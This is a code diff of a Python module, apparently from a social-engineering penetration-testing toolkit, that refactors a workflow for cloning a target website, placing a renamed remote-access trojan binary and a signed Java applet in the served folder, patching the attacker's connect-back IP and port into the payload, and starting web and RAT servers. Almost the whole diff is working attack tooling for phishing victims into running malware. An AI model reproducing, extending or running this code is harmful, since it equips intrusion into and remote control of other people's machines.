@@ -108,20 +108,26 @@ def java_applet_attack_tw(website, port, directory, ipaddr):
                 # define executable name and rename it
                 filename = line.rstrip()
                 # move the file to the specified directory and filename
-                subprocess.Popen("cp src/payloads/ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory, filename), shell=True).wait()
+                subprocess.Popen(
+                    f"cp src/payloads/ratte/ratte.binary {directory}/{filename} 1> /dev/null 2> /dev/null",
+                    shell=True,
+                ).wait()
 
     # lastly we need to copy over the signed applet
-    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (userconfigpath, directory), shell=True).wait()
+    subprocess.Popen(
+        f"cp {userconfigpath}/Signed_Update.jar {directory} 1> /dev/null 2> /dev/null",
+        shell=True,
+    ).wait()
 
     # TODO index.html parsen und IPADDR:Port ersetzen
     with open(os.path.join(directory, "index.html"), "rb") as fileopen:
         data = fileopen.read()
 
     with open(os.path.join(directory, "index.html"), 'wb') as filewrite:
-        to_replace = core.grab_ipaddress() + ":80"
+        to_replace = f"{core.grab_ipaddress()}:80"
 
         # replace 3 times
-        filewrite.write(data.replace(str(to_replace), ipaddr + ":" + str(port), 3))
+        filewrite.write(data.replace(str(to_replace), f"{ipaddr}:{str(port)}", 3))
 
     # start the web server by running it in the background
     start_web_server_tw(directory, port)
@@ -154,11 +160,7 @@ def prepare_ratte(ipaddr, ratteport, persistent, customexe):
         r_port = (len(str(ratteport)) + 1) * "Y"
         pers = (len(str(persistent)) + 1) * "Z"
         # check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
-        if customexe:
-            cexe = (len(str(customexe)) + 1) * "Q"
-        else:
-            cexe = ""
-
+        cexe = (len(str(customexe)) + 1) * "Q" if customexe else ""
         filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))
 
 
@@ -179,10 +181,8 @@ def main():
         website = input(core.setprompt(["9", "2"], "Enter website to clone (ex. https://gmail.com)"))
         site = urlparse(website)
 
-        if site.scheme == "http" or site.scheme == "https":
-            if site.netloc != "":
-                valid_site = True
-            else:
+        if site.scheme in ["http", "https"]:
+            if site.netloc == "":
                 if site_input_counter == 2:
                     core.print_error("\nMaybe you have the address written down wrong?" + core.bcolors.ENDC)
                     sleep(4)
@@ -190,20 +190,21 @@ def main():
                 else:
                     core.print_warning("I can't determine the fqdn or IP of the site. Try again?")
                     site_input_counter += 1
-        else:
-            if site_input_counter == 2:
-                core.print_error("\nMaybe you have the address written down wrong?")
-                sleep(4)
-                return
             else:
-                core.print_warning("I couldn't determine whether this is an http or https site. Try again?")
-                site_input_counter += 1
-                # core.DebugInfo("site.scheme is: %s " % site.scheme)
-                # core.DebugInfo("site.netloc is: %s " % site.netloc)
-                # core.DebugInfo("site.path is: %s " % site.path)
-                # core.DebugInfo("site.params are: %s " % site.params)
-                # core.DebugInfo("site.query is: %s " % site.query)
-                # core.DebugInfo("site.fragment is: %s " % site.fragment)
+                valid_site = True
+        elif site_input_counter == 2:
+            core.print_error("\nMaybe you have the address written down wrong?")
+            sleep(4)
+            return
+        else:
+            core.print_warning("I couldn't determine whether this is an http or https site. Try again?")
+            site_input_counter += 1
+            # core.DebugInfo("site.scheme is: %s " % site.scheme)
+            # core.DebugInfo("site.netloc is: %s " % site.netloc)
+            # core.DebugInfo("site.path is: %s " % site.path)
+            # core.DebugInfo("site.params are: %s " % site.params)
+            # core.DebugInfo("site.query is: %s " % site.query)
+            # core.DebugInfo("site.fragment is: %s " % site.fragment)
 
     while not valid_ip and input_counter < 3:
         ipaddr = input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
@@ -274,7 +275,10 @@ def main():
     with open(os.path.join(userconfigpath, definepath, "/rand_gen")) as fileopen:
         for line in fileopen:
             ratte_random = line.rstrip()
-        subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (os.path.join(userconfigpath, definepath), definepath, ratte_random), shell=True).wait()
+        subprocess.Popen(
+            f"cp {os.path.join(userconfigpath, definepath)}/ratteM.exe {definepath}/reports/{ratte_random}",
+            shell=True,
+        ).wait()
 
     #######################
     # start ratteserver
